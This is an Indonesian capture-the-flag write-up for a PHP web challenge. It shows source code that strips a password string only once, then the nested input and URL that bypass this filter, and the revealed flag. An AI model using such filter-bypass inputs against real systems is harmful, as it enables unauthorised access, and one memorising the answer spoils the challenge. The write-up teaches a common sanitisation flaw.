# Sanitasi (150 Points)
Mbak Ukhty, memiliki sebuah website yang menyimpan sebuah rahasia, bisakah kamu mendapatkan rahasia tersebut ? <br>
http://soal.pucc.or.id/sanitasi/
# Solved
Mari kita lihat source pada website tersebut!
```php
require "flag.php";

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die();
}

if(isset($_GET['password']))
{
    $password = $_GET['password'];
    $yang_diterima = 'mbak_ukhty_1337';
    $filter = preg_replace("/$yang_diterima/", '', $password);

    if($filter === $yang_diterima)
    {
        echo "Flag nya adalah : ".FLAG;
    }
    else
    {
        echo "Salah Koplok";
    }

}
```
Bisa saya anggap ini adalah, <b>Bypass Matches Regex</b>. Ini adalah input yang saya berikan
```
mbak_ukhtymbak_ukhty_1337_1337
```
```
https://soal.pucc.or.id/sanitasi/?password=mbak_ukhtymbak_ukhty_1337_1337
```
Flag : <b>PUCC{php_s4nit4t10n_1s_w3ak}</b>
